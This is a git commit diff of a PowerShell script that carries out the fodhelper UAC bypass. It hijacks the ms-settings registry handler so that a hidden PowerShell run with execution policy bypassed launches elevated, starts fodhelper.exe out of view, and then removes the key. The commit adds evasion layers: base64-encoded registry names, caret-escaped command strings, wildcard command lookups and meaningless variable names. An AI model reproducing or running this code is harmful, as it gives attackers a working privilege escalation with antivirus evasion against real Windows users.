0e035034e9e9c36229aa6b44fa277bcefbc365fe
Eibon <102199146+Eib0nn@users.noreply.github.com>
2025-04-07 23:18:47 -0300

    i think i fucked everything, lmao

--- bpsadm.ps1
+++ bpsadm.ps1
@@ -48,14 +48,22 @@ $shitty = "SEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hb
 $shitty2 = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($shitty))
 $c10ea18da43749a6847617b29862e38d = $shitty2
 
-$90ijd12099hwdh01dhw0dw100jhi1dw0 = "Y21kIC9jIHN0YXJ0IC9taW4gcG93ZXJzaGVsbCAtZXAgYl5eeV5eXnBhXnNzIC1mXmlebF5lIEM6XFVzZXJzXHRoaWVycnlcRGVza3RvcFxwc2VoandhZFx0ZXN0X2VsZXZhdGlvbi5wczE="
-$u9d120i1i0sdojnka090182389jkdjkk = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($90ijd12099hwdh01dhw0dw100jhi1dw0))
-$459b05be8e2b43819fce3d3683c9bc53 = $u9d120i1i0sdojnka090182389jkdjkk
+$9unhhd0182h12d0ni0inniiio12do902 = "test_elevation.ps1"
+$scriptPath = Join-Path $PSScriptRoot $9unhhd0182h12d0ni0inniiio12do902
 
+$459b05be8e2b43819fce3d3683c9bc53 = "cmd /c start /min pow^ersh^ell -ep b^yp^as^s -fi^le `"$scriptPath`""
+#new item
 New-Item $c10ea18da43749a6847617b29862e38d -Force | Out-Null
-Set-ItemProperty $c10ea18da43749a6847617b29862e38d -Name "DelegateExecute" -Value ""
-Set-ItemProperty $c10ea18da43749a6847617b29862e38d -Name "(Default)" -Value $459b05be8e2b43819fce3d3683c9bc53
-Start-Process "cmd.exe" -ArgumentList "/c s^t^^a^r^t f^o^d^h^e^l^p^e^r.exe" -WindowStyle Hidden
+
+$09dhu1212h09810h20hd210ii0hd120 = "RGVsZWdhdGVFeGVjdXRl"
+$h89d219u2h1287uyh129hd9128u91ui = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($09dhu1212h09810h20hd210ii0hd120))
+$09d09810h20hd210ii0hd120hu1212h = "KERlZmF1bHQp"
+$hu2h1287uyh129hd9128u91uid219 = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($09d09810h20hd210ii0hd120hu1212h))
+#Set-ItemProperty
+&(Get-Command s****************t-it*y) $c10ea18da43749a6847617b29862e38d -NAMe $h89d219u2h1287uyh129hd9128u91ui -VAlue ""
+&(Get-Command s****************t-it*y) $c10ea18da43749a6847617b29862e38d -name $hu2h1287uyh129hd9128u91uid219 -VaLuE $459b05be8e2b43819fce3d3683c9bc53
+#start-process
+&(Get-Command s****************t-pr*s)  "cmd.exe" -ArGumENtList "/c s^t^ar^t fod^he^lp^er.exe" -WindowStyle Hidden
 
 Start-Sleep 3
 Remove-Item $c10ea18da43749a6847617b29862e38d -Force -Recurse -ErrorAction SilentlyContinue
